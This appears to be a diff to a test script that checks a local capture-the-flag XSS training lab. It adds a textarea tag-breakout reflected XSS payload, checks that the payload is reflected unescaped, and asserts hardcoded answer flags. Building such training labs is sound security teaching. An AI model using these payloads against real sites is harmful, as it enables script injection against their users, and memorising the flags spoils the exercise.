@@ -203,13 +203,18 @@ def main():
         check(f"S11 Connection failed: {e}", False)
 
     # ── Scenario 12 (Port 8012) ──────────────────────────────────────────────
-    print("\n--- [Scenario 12] Port 8012: Reflected XSS (HTML Context) ---")
+    print("\n--- [Scenario 12] Port 8012: Reflected XSS (Tag Breakout) ---")
     try:
-        payload_12 = "<script>alert('xss')</script>"
+        # Test 1: plain script is trapped inside textarea
+        r12_trapped = requests.get(f"http://{HOST}:8012/search", params={"q": "<script>alert(1)</script>"}, timeout=3)
+        check("S12: Direct script tag trapped inside textarea buffer", "<textarea class=\"query-echo-box\" readonly rows=\"2\"><script>alert(1)</script></textarea>" in r12_trapped.text)
+
+        # Test 2: textarea closing tag breaks out
+        payload_12 = "</textarea><script>alert('xss')</script>"
         r12 = requests.get(f"http://{HOST}:8012/search", params={"q": payload_12}, timeout=3)
-        check("S12: Search query reflected unescaped into HTML", payload_12 in r12.text)
+        check("S12: Tag breakout reflected unescaped into HTML", payload_12 in r12.text)
         flag_s12 = extract_flag(r12.text)
-        check("S12: Hidden DOM session flag token present", flag_s12 == "CTF{r3fl3ct3d_xss_b4s1cs}")
+        check("S12: Flag token available in success box", flag_s12 == "CTF{r3fl3ct3d_xss_b4s1cs}")
         print(f"     -> Flag: {flag_s12}")
     except Exception as e:
         check(f"S12 Connection failed: {e}", False)
@@ -223,6 +228,8 @@ def main():
         check("S13: Attribute breakout payload stored and reflected in value attribute", f'value="{attr_payload}"' in r13.text)
         flag_s13 = extract_flag(r13.text)
         check("S13: Secret vault key present in challenge context", flag_s13 == "CTF{st0r3d_4ttr1but3_br34k0ut}")
+        # Clean up database after test so it leaves clean state for manual user training
+        requests.get(f"http://{HOST}:8013/reset", timeout=3)
         print(f"     -> Flag: {flag_s13}")
     except Exception as e:
         check(f"S13 Connection failed: {e}", False)
